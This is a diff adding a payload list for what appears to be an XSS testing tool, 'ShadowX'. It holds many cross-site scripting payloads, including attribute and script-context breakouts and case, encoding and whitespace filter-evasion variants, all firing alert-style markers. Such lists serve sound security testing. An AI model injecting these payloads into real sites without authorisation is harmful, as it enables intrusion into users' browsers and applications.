@@ -1,0 +1,232 @@
+# ShadowX XSS Payloads
+# Advanced context-aware XSS payloads for comprehensive testing
+# Created by: adce626
+
+# Basic Script Injection
+<script>alert("{{MARKER}}")</script>
+<script>prompt("{{MARKER}}")</script>
+<script>confirm("{{MARKER}}")</script>
+<script>console.log("{{MARKER}}")</script>
+
+# Image-based Payloads
+<img src=x onerror=alert("{{MARKER}}")>
+<img src=x onerror=prompt("{{MARKER}}")>
+<img src=x onerror=confirm("{{MARKER}}")>
+<img src=x onerror=console.log("{{MARKER}}")>
+<img src="javascript:alert('{{MARKER}}')">
+
+# SVG Payloads
+<svg onload=alert("{{MARKER}}")>
+<svg><script>alert("{{MARKER}}")</script></svg>
+<svg onload=prompt("{{MARKER}}")>
+<svg><animate onbegin=alert("{{MARKER}}")>
+<svg><foreignObject><script>alert("{{MARKER}}")</script></foreignObject></svg>
+
+# Event Handler Payloads
+<div onmouseover=alert("{{MARKER}}")>
+<span onclick=alert("{{MARKER}}")>
+<p onload=alert("{{MARKER}}")>
+<body onpageshow=alert("{{MARKER}}")>
+<form oninput=alert("{{MARKER}}")>
+<select onfocus=alert("{{MARKER}}")>
+<textarea onblur=alert("{{MARKER}}")>
+<input onkeypress=alert("{{MARKER}}")>
+<button onmouseout=alert("{{MARKER}}")>
+
+# JavaScript Protocol
+javascript:alert("{{MARKER}}")
+JavaScript:alert("{{MARKER}}")
+JAVASCRIPT:alert("{{MARKER}}")
+javas	cript:alert("{{MARKER}}")
+javas
+cript:alert("{{MARKER}}")
+
+# iframe Payloads
+<iframe src=javascript:alert("{{MARKER}}")>
+<iframe src="data:text/html,<script>alert('{{MARKER}}')</script>">
+<iframe onload=alert("{{MARKER}}")>
+
+# Object/Embed Payloads
+<object data=javascript:alert("{{MARKER}}")>
+<object data="data:text/html,<script>alert('{{MARKER}}')</script>">
+<embed src=javascript:alert("{{MARKER}}")>
+
+# Form-based Payloads
+<form><button formaction=javascript:alert("{{MARKER}}")>
+<form><input type=submit formaction=javascript:alert("{{MARKER}}")>
+<isindex action=javascript:alert("{{MARKER}}")>
+
+# Audio/Video Payloads
+<audio src=x onerror=alert("{{MARKER}}")>
+<video poster=javascript:alert("{{MARKER}}")>
+<video src=x onerror=alert("{{MARKER}}")>
+
+# Meta/Link Payloads
+<meta http-equiv=refresh content="0;url=javascript:alert('{{MARKER}}')">
+<link rel=stylesheet href="javascript:alert('{{MARKER}}')">
+
+# CSS Injection
+<style>@import "javascript:alert('{{MARKER}}')";</style>
+<style>body{background:url("javascript:alert('{{MARKER}}')")}</style>
+<style>*{color:expression(alert('{{MARKER}}'))}</style>
+
+# Template Literals
+<script>`alert("{{MARKER}}")`</script>
+<script>alert`{{MARKER}}`</script>
+
+# Alternative Execution Methods
+<script>eval(alert("{{MARKER}}"))</script>
+<script>Function("alert('{{MARKER}}')")();</script>
+<script>setTimeout("alert('{{MARKER}}')",1)</script>
+<script>setInterval("alert('{{MARKER}}')",1)</script>
+
+# Unicode/Encoding Variations
+<script>\u0061lert("{{MARKER}}")</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,34)+"{{MARKER}}"+String.fromCharCode(34,41))</script>
+
+# Case Variations
+<ScRiPt>alert("{{MARKER}}")</ScRiPt>
+<sCrIpT>alert("{{MARKER}}")</sCrIpT>
+<SCRIPT>alert("{{MARKER}}")</SCRIPT>
+
+# Alternative Quotes
+<script>alert('{{MARKER}}')</script>
+<script>alert(`{{MARKER}}`)</script>
+<img src=x onerror=alert('{{MARKER}}')>
+<img src=x onerror=alert(`{{MARKER}}`)>
+
+# Whitespace Variations
+<script >alert("{{MARKER}}")</script>
+<script	>alert("{{MARKER}}")</script>
+<script
+>alert("{{MARKER}}")</script>
+< script>alert("{{MARKER}}")</script>
+
+# HTML5 Tags
+<details ontoggle=alert("{{MARKER}}")>
+<marquee onstart=alert("{{MARKER}}")>
+<menu id=x contextmenu=x onshow=alert("{{MARKER}}")>
+<keygen onfocus=alert("{{MARKER}}")>
+
+# Break Out Payloads for Attributes
+">alert("{{MARKER}}")<!--
+">alert("{{MARKER}}")</script>
+'">alert("{{MARKER}}")<!--
+'">alert("{{MARKER}}")</script>
+
+# Break Out Payloads for Script Context
+";alert("{{MARKER}}")//
+';alert("{{MARKER}}")//
+*/alert("{{MARKER}}")/*
+</script><script>alert("{{MARKER}}")</script>
+
+# Data URI Payloads
+<object data="data:text/html,<script>alert('{{MARKER}}')</script>">
+<embed src="data:text/html,<script>alert('{{MARKER}}')</script>">
+
+# Comment-based Payloads
+<!--<script>alert("{{MARKER}}")</script>-->
+<![CDATA[<script>alert("{{MARKER}}")</script>]]>
+
+# Advanced DOM Manipulation
+<script>document.write("<img src=x onerror=alert('{{MARKER}}')>")</script>
+<script>document.body.innerHTML="<img src=x onerror=alert('{{MARKER}}')>"</script>
+<script>document.createElement('img').onerror=function(){alert('{{MARKER}}')};document.body.appendChild(document.images[0])</script>
+
+# Event-based DOM Ready
+<script>document.addEventListener('DOMContentLoaded',function(){alert('{{MARKER}}')});</script>
+<script>window.onload=function(){alert('{{MARKER}}')}</script>
+
+# Storage-based Payloads
+<script>localStorage.setItem('xss','{{MARKER}}');alert(localStorage.getItem('xss'))</script>
+<script>sessionStorage.setItem('xss','{{MARKER}}');alert(sessionStorage.getItem('xss'))</script>
+
+# WebRTC Payloads
+<script>try{var pc=new RTCPeerConnection();pc.createDataChannel('');pc.createOffer().then(function(){alert('{{MARKER}}')});}catch(e){}</script>
+
+# Service Worker Payloads
+<script>if('serviceWorker' in navigator){alert('{{MARKER}}')}</script>
+
+# Fetch API Payloads
+<script>fetch('data:,').then(function(){alert('{{MARKER}}')}).catch(function(){alert('{{MARKER}}')});</script>
+
+# Promise-based Payloads
+<script>Promise.resolve().then(function(){alert('{{MARKER}}')});</script>
+<script>new Promise(function(resolve){resolve();alert('{{MARKER}}')});</script>
+
+# Generator Functions
+<script>function* gen(){yield alert('{{MARKER}}')}gen().next()</script>
+
+# Arrow Functions
+<script>(()=>alert('{{MARKER}}'))()</script>
+<script>((x)=>alert(x))('{{MARKER}}')</script>
+
+# Proxy Objects
+<script>new Proxy({},{get:function(){alert('{{MARKER}}')}}).x</script>
+
+# Symbol-based
+<script>Symbol.for('{{MARKER}}');alert('{{MARKER}}')</script>
+
+# Map/Set Objects
+<script>new Map().set('x',alert('{{MARKER}}'))</script>
+<script>new Set([alert('{{MARKER}}')])</script>
+
+# Array Methods
+<script>[].constructor.constructor('alert("{{MARKER}}")')();</script>
+<script>[].map.constructor('alert("{{MARKER}}")')();</script>
+
+# RegExp-based
+<script>/{{MARKER}}/.exec('') || alert('{{MARKER}}')</script>
+
+# Error Handling
+<script>try{throw new Error('{{MARKER}}')}catch(e){alert(e.message)}</script>
+
+# Conditional Payloads
+<script>if(1)alert('{{MARKER}}')</script>
+<script>1?alert('{{MARKER}}'):0</script>
+<script>true&&alert('{{MARKER}}')</script>
+<script>false||alert('{{MARKER}}')</script>
+
+# Math Object
+<script>Math.random()>0?alert('{{MARKER}}'):0</script>
+
+# Date Object
+<script>new Date(alert('{{MARKER}}'))</script>
+
+# JSON Payloads
+<script>JSON.parse('{"x":"{{MARKER}}"}');alert('{{MARKER}}')</script>
+
+# URL/Location Payloads
+<script>location='javascript:alert("{{MARKER}}")'</script>
+<script>location.href='javascript:alert("{{MARKER}}")'</script>
+
+# Window Methods
+<script>window['alert']('{{MARKER}}')</script>
+<script>window['al'+'ert']('{{MARKER}}')</script>
+<script>self.alert('{{MARKER}}')</script>
+<script>top.alert('{{MARKER}}')</script>
+<script>parent.alert('{{MARKER}}')</script>
+
+# Document Methods
+<script>document.defaultView.alert('{{MARKER}}')</script>
+
+# Frame Targeting
+<script>frames[0]?frames[0].alert('{{MARKER}}'):alert('{{MARKER}}')</script>
+
+# Context-Specific Script Breaks
+";alert("{{MARKER}}");var x="
+';alert("{{MARKER}}");var x='
+</title><script>alert("{{MARKER}}")</script>
+</textarea><script>alert("{{MARKER}}")</script>
+</noscript><script>alert("{{MARKER}}")</script>
+
+# Style Attribute Breaks
+expression(alert("{{MARKER}}"))
+url(javascript:alert("{{MARKER}}"))
+";alert("{{MARKER}}");"
+
+# Event Handler Breaks
+" onmouseover="alert('{{MARKER}}')"
+' onmouseover='alert("{{MARKER}}")'
+" onfocus="alert('{{MARKER}}')" autofocus="
+' onfocus='alert("{{MARKER}}")' autofocus='
